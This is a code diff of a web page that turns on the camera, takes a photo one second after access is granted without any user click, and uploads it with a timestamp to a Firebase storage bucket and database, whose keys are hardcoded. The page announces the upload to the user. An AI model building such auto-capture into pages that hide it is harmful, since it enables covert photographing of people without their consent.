@@ -11,25 +11,29 @@
     <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>
 
     <style>
-        body { font-family: Arial, sans-serif; }
-        video, canvas { width: 320px; height: 240px; border: 1px solid black; }
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            margin-top: 30px;
+        }
+        video { width: 320px; height: 240px; border: 2px solid black; }
     </style>
 </head>
 <body>
 
-<h2>Selfie Auto Capture</h2>
+<h2>Camera Selfie Auto Capture</h2>
 
 <video id="video" autoplay></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
 <script>
-    // ------------------------ FIREBASE CONFIG ------------------------
+    // ------------------------ CORRECT FIREBASE CONFIG ------------------------
     const firebaseConfig = {
       apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
       authDomain: "esrat-4e28f.firebaseapp.com",
       databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com",
       projectId: "esrat-4e28f",
-      storageBucket: "esrat-4e28f.appspot.com",
+      storageBucket: "esrat-4e28f.firebasestorage.app",
       messagingSenderId: "712315598095",
       appId: "1:712315598095:android:ed0f042ee1d5410dfb7a7a"
     };
@@ -48,7 +52,7 @@
         .then(stream => {
             video.srcObject = stream;
 
-            // 📸 Auto-capture when camera starts (1 second delay)
+            // Wait 1 second → then auto capture
             setTimeout(captureAndUpload, 1000);
         })
         .catch(err => {
@@ -67,17 +71,17 @@
             const storageRef = storage.ref("selfies/" + filename);
 
             storageRef.put(blob).then(() => {
-                console.log("Uploaded:", filename);
 
-                // Save metadata to DB
+                // Save metadata to database
                 db.ref("selfies/" + timestamp).set({
                     filename: filename,
                     timestamp: timestamp
                 });
 
-                alert("Selfie captured & uploaded!");
+                alert("Selfie captured & uploaded successfully!");
             }).catch(err => {
                 console.error("Upload error:", err);
+                alert("Upload failed, check console.");
             });
         }, "image/jpeg", 0.9);
     }
